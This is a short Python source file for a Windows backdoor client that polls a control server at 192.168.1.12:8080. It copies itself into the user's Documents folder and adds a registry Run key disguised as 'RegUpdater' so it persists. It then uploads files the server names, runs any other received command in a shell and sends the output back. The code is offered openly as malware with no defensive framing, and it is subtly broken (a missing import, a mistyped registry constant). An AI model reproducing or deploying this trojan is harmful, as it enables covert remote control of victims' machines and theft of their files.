import requests
import subprocess
import time
import shutil
import winreg as wreg

path = os.getcwd().strip('/n')

Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE).decode().split('=')

destination = userprof.strip('\n\r') + '\\Document\\' + 'client.exe'

if not os.path.exists(destination):
    shutil.copyfile(path+'\client.exe', destination)
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows\CurrentVersion\Run",0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG SZ, destination)
    key.Close()


while True:
     req = requests.get('http://192.168.1.12:8080')
     command = req.text

     if 'terminate' in command:
         break
     elif 'grab' in command:
         grab,path = command.split("*")
         if os.path.exists(path):
             url = "http://192.168.1.12:8080/data"
             files = {'file': open(path,'rb')}
             r = requests.post(url, files=files)
         else:
             post_response = requests.post(url='http://192.168.1.12:8080', data='Not able to find file')
     
     else:
         CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
         post_response = requests.post(url='http://192.168.1.12:8080',data=CMD.stdout.read())
         post_response = requests.post(url='http://192.168.1.12:8080',data=CMD.stderr.read())
     time.sleep(3) 
    
